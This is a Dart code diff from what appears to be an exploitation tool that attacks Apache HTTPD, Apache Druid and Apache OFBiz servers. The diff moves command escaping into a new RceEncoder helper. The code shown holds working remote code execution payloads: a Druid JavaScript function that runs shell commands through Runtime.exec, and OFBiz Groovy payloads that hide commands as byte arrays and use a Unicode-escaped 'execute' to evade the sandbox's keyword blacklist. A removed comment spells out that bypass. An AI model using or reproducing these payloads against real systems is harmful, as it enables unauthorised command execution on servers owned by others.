@@ -5,6 +5,7 @@ import 'package:http/http.dart' as http;
 import 'package:http/io_client.dart';
 
 import 'exp_result.dart';
+import 'rce_encoder.dart';
 
 class ApacheHttpdExpService {
   final String baseUrl;
@@ -176,7 +177,7 @@ class DruidExpService {
       baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
 
   String _buildPayload(String cmd) {
-    final safeCmd = cmd.replaceAll(r'\', r'\\').replaceAll('"', r'\"');
+    final safeCmd = RceEncoder.escapeDoubleQuoted(cmd);
     final jsFunction =
         'function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(["sh","-c","$safeCmd"]).getInputStream()).useDelimiter("\\\\A").next();return {timestamp:123123,test: a}}';
     return jsonEncode({
@@ -397,13 +398,7 @@ class OFBizExpService {
   Future<String?> execRce(String cmd) async {
     final client = _client();
     try {
-      // OFBiz's Groovy sandbox scans script text for blacklisted command
-      // keywords (e.g. whoami, base64).  Bypass by encoding the command as
-      // a byte-code array that Groovy reconstructs at runtime, so no literal
-      // keyword ever appears in the script source.  Also use \u0065xecute
-      // (Groovy Unicode escape → 'execute') to avoid matching .execute().
-      // Shell execution via ['sh','-c',...] handles PATH, args and globs.
-      final cmdBytes = cmd.codeUnits.join(',');
+      final cmdBytes = RceEncoder.groovyByteArray(cmd);
       final payload =
           "throw new Exception(['sh','-c',new String([$cmdBytes] as byte[])"
           "+' 2>&1'].\\u0065xecute().text);";
@@ -457,7 +452,7 @@ class OFBizExpService {
   Future<String?> execRce38856(String cmd) async {
     final client = _client();
     try {
-      final cmdBytes = cmd.codeUnits.join(',');
+      final cmdBytes = RceEncoder.groovyByteArray(cmd);
       final groovyCode =
           "throw new Exception(['sh','-c',new String([$cmdBytes] as byte[])"
           "+' 2>&1'].\\u0065xecute().text);";
